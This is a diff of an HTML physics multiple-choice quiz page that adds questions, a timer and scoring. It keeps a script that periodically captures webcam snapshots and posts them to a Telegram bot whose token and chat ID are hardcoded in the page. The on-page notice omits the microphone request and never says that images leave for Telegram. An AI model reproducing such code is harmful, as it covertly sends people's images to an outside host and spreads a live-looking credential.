@@ -1,41 +1,156 @@
-<html>
+<!DOCTYPE html><html>
 <head>
-  <title>MCQ with Screenshot to Telegram</title>
+  <title>Physics MCQ Test with Monitoring</title>
   <style>
     body {
       background: #222;
       color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 30px;
+      max-width: 1000px;
+      margin: auto;
+    }
+    h1, h2 {
       text-align: center;
-      font-family: Arial;
-      padding: 40px;
     }
     video {
       width: 300px;
-      border: 4px solid #fff;
+      border: 3px solid #fff;
       border-radius: 10px;
+      margin: 20px auto;
+      display: block;
+    }
+    .question {
+      margin: 20px 0;
+      padding: 15px;
+      background: #333;
+      border-radius: 10px;
+    }
+    .question p {
+      font-weight: bold;
+    }
+    .options label {
+      display: block;
+      margin: 5px 0;
+      cursor: pointer;
+    }
+    canvas {
+      display: none;
+    }
+    .submit-btn {
+      background: #28a745;
+      color: white;
+      padding: 12px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
       margin-top: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    #timer {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 20px;
+      color: #ff0;
     }
   </style>
 </head>
 <body>
-  <h1>MCQ Test with Monitoring</h1>
-  <p>Camera and mic access required. Monitoring active.</p>
+  <h1>Physics MCQ Test with Monitoring</h1>
+  <p style="text-align:center;">Monitoring active: Camera access required</p>
   <video id="video" autoplay muted playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas"></canvas>  <div id="timer">Time Left: 30:00</div>
+  <form id="quizForm"></form>
+  <button type="button" class="submit-btn" onclick="submitQuiz()">Submit Quiz</button>
+  <div id="result"></div>  <script>
+    const questions = [
+  { q: "Which of the following is a base quantity in SI?", options: ["Speed", "Area", "Luminous intensity", "Force"], answer: 2 },
+  { q: "Which system of units is currently internationally accepted?", options: ["CGS", "MKS", "FPS", "SI"], answer: 3 },
+  { q: "Which of the following is a derived unit?", options: ["Kilogram", "Metre", "Newton", "Ampere"], answer: 2 },
+  { q: "The SI unit of thermodynamic temperature is:", options: ["Degree Celsius", "Kelvin", "Fahrenheit", "Joule"], answer: 1 },
+  { q: "What is the dimension of force?", options: ["[M¹L¹T⁻²]", "[M¹L⁰T⁻²]", "[M⁰L¹T⁻²]", "[M¹L¹T⁰]"], answer: 0 },
+  { q: "1 Ångström =", options: ["10⁻⁶ m", "10⁻⁹ m", "10⁻¹⁰ m", "10⁻¹² m"], answer: 2 },
+  { q: "The unit of solid angle is:", options: ["Radian", "Degree", "Steradian", "Gradian"], answer: 2 },
+  { q: "Which of the following quantities is dimensionless?", options: ["Force", "Angle", "Speed", "Mass"], answer: 1 },
+  { q: "The number of base SI units is:", options: ["5", "6", "7", "8"], answer: 2 },
+  { q: "Relative density is:", options: ["Has units of kg/m³", "Dimensionless", "Measured in g/cm³", "Measured in Pascal"], answer: 1 },
+  { q: "Significant figures in 0.02308 are:", options: ["2", "3", "4", "5"], answer: 2 },
+  { q: "The trailing zero(s) in 3.500 are:", options: ["Not significant", "Significant", "Rounded", "Negligible"], answer: 1 },
+  { q: "Which quantity has the same dimension as work?", options: ["Energy", "Velocity", "Pressure", "Power"], answer: 0 },
+  { q: "What is the dimensional formula of velocity?", options: ["[M⁰L⁰T⁻¹]", "[M⁰L¹T⁻¹]", "[M¹L¹T⁻²]", "[M⁰L²T⁻²]"], answer: 1 },
+  { q: "Which rule is used to check correctness of physical equations?", options: ["Principle of equality", "Principle of addition", "Principle of homogeneity", "Principle of equivalence"], answer: 2 },
+  { q: "In multiplication/division, the final result should have:", options: ["Maximum decimal places", "Least number of significant figures", "Maximum significant figures", "Equal figures as numerator"], answer: 1 },
+  { q: "Dimensional formula of density is:", options: ["[ML⁻¹T⁰]", "[MLT⁻¹]", "[ML⁻³T⁰]", "[M⁰L⁰T⁰]"], answer: 2 },
+  { q: "1 light year is approximately:", options: ["9.47 × 10¹² m", "9.47 × 10¹⁵ m", "3 × 10⁸ m", "3.15 × 10⁷ m"], answer: 1 },
+  { q: "Which is an exact number with infinite significant figures?", options: ["π = 3.14", "g = 9.8 m/s²", "2 in d = 2r", "3.142857"], answer: 2 },
+  { q: "A unit that is not part of SI but retained for general use:", options: ["Light year", "Erg", "Minute", "Dyne"], answer: 2 },
+  { q: "Which formula is incorrect dimensionally for kinetic energy?", options: ["K = m²v³", "K = (1/2)mv²", "K = (3/16)mv²", "K = mv²"], answer: 0 },
+  { q: "In addition/subtraction, result should have:", options: ["Least number of significant figures", "Least number of decimal places", "Maximum decimal precision", "Same unit"], answer: 1 },
+  { q: "Order of magnitude of 3.2 × 10⁴ is:", options: ["3", "4", "5", "32"], answer: 1 },
+  { q: "Dimensional formula of acceleration is:", options: ["[M⁰LT⁻²]", "[MLT⁻²]", "[ML⁻²T⁻¹]", "[ML⁻¹T²]"], answer: 0 },
+  { q: "To avoid rounding errors in calculations, keep:", options: ["Less digits", "Only integers", "One more significant digit in intermediate steps", "Maximum precision in beginning"], answer: 2 },
+  { q: "Dimensional formula of energy is:", options: ["[MLT²]", "[ML²T⁻²]", "[ML⁻²T²]", "[MLT⁻¹]"], answer: 1 },
+  { q: "Which is dimensionally correct?", options: ["KE = mv³", "KE = ma", "KE = ½mv²", "KE = mg²"], answer: 2 },
+  { q: "Significant figures in 6.320 are:", options: ["2", "3", "4", "5"], answer: 2 },
+  { q: "Which can be added/subtracted together?", options: ["Velocity + acceleration", "Mass + energy", "Speed + distance", "Quantities with same dimensions"], answer: 3 },
+  { q: "Dimensional analysis cannot determine:", options: ["Correctness of equation", "Value of constants", "Physical units", "Homogeneity"], answer: 1 }
+];
 
-  <script>
+    questions.sort(() => 0.5 - Math.random()); // randomize
+
+    const form = document.getElementById("quizForm");
+    questions.forEach((q, i) => {
+      const div = document.createElement("div");
+      div.className = "question";
+      div.innerHTML = `<p>Q${i+1}: ${q.q}</p>` +
+        q.options.map((opt, j) => 
+          `<label><input type='radio' name='q${i}' value='${j}'> ${opt}</label>`
+        ).join('');
+      form.appendChild(div);
+    });
+
+    function submitQuiz() {
+      let score = 0;
+      let output = "<h2>Result:</h2><ul>";
+      questions.forEach((q, i) => {
+        const selected = form[`q${i}`].value;
+        const correct = q.answer;
+        if (selected == correct) score++;
+        output += `<li>Q${i+1}: <strong>${q.options[correct]}</strong> (Your answer: ${q.options[selected] || 'Not answered'})</li>`;
+      });
+      output += `</ul><h3>Your Score: ${score}/${questions.length}</h3>`;
+      document.getElementById("result").innerHTML = output;
+    }
+
+    // Timer
+    let time = 30 * 60;
+    const timerDisplay = document.getElementById("timer");
+    const timer = setInterval(() => {
+      const min = Math.floor(time / 60);
+      const sec = time % 60;
+      timerDisplay.textContent = `Time Left: ${min}:${sec.toString().padStart(2, '0')}`;
+      if (--time < 0) {
+        clearInterval(timer);
+        submitQuiz();
+        alert("Time's up! Quiz submitted automatically.");
+      }
+    }, 1000);
+
+    // Camera Screenshot to Telegram
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const context = canvas.getContext("2d");
-
-    const TELEGRAM_BOT_TOKEN = '7587653803:AAH6KKtv86RP8EB2zFHLgxwFmfK28eytULQ'; // replace
-    const TELEGRAM_CHAT_ID = '7434840413';     // replace
+    const TELEGRAM_BOT_TOKEN = '7587653803:AAH6KKtv86RP8EB2zFHLgxwFmfK28eytULQ';
+    const TELEGRAM_CHAT_ID = '7434840413';
 
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         video.srcObject = stream;
-        setInterval(takeScreenshotAndSend, 2 * 60 * 1000); // every 2 minutes
+        setInterval(takeScreenshotAndSend, 2 * 60 * 1000);
       } catch (err) {
         alert("Camera/Mic permission required.");
       }
@@ -56,14 +171,9 @@
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
-      }).then(res => {
-        console.log('Screenshot sent to Telegram.');
-      }).catch(err => {
-        console.error('Telegram upload failed', err);
       });
     }
 
     startCamera();
-  </script>
-</body>
+  </script></body>
 </html>
